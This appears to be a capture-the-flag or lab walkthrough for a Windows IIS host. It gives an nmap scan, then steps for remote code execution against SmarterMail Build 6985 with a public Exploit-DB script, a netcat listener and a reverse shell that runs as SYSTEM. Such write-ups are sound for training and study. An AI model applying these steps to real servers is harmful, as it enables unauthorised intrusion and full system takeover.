## System Info
- **IP:** 192.168.147.65  
- **OS:** Windows (IIS, .NET Remoting)

---

## Nmap Scan
```bash
sudo nmap -p- -sS -sV 192.168.147.65
```
```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds
9998/tcp  open  http          Microsoft IIS httpd 10.0
17001/tcp open  remoting      MS .NET Remoting services
```

- **Port 80:** default IIS page (no application).
- **Port 9998:** SmarterMail login portal.
- **Port 17001:** .NET Remoting (potential RCE vector).

---

## Initial Exploit: SmarterMail RCE

1. **Identify target service**  
   - SmarterMail Build 6985 is known to be RCE‑vulnerable.  
   - Port 9998 hosts the SmarterMail web interface.

2. **Download exploit**  
   - From Exploit‑DB: *SmarterMail Build 6985 – Remote Code Execution*.

3. **Configure exploit**  
   - Edit exploit file to set `RHOST = 192.168.147.65` and `RPORT = 9998`.  
   - Set `LPORT = 21` (for reverse shell).

4. **Prepare listener**  
   ```bash
   sudo nc -lvp 21
   ```

5. **Run exploit**  
   ```bash
   python3 smartermail_rce.py
   ```
   - Received reverse shell as **SYSTEM**.
